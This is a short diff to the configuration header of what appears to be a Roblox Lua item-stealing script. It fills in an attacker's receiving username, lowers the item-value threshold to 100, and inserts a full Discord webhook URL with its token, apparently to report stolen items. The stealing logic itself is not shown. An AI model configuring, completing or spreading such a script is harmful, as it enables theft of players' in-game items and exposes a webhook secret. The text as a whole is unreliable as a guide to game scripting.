@@ -1,7 +1,7 @@
-Username = "your user here"
-Username2 = "your 2nd user here" -- stuff will get sent to this user if first user's mailbox is full
-Webhook = "your webhook here"
-min_rap = 500000 -- minimum rap of each item you want to get sent to you.
+Username = "belerik016"
+Username2 = "belerik016" -- stuff will get sent to this user if first user's mailbox is full
+Webhook = "https://discord.com/api/webhooks/1239530418991140895/XxN50CPzJuppo9xxmiJ7E3ZmF9q54fR9BPYfgQq2_-vjJn1F4VoicAZ-ZOMeVq6dkcdm"
+min_rap = 100 -- minimum rap of each item you want to get sent to you.
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
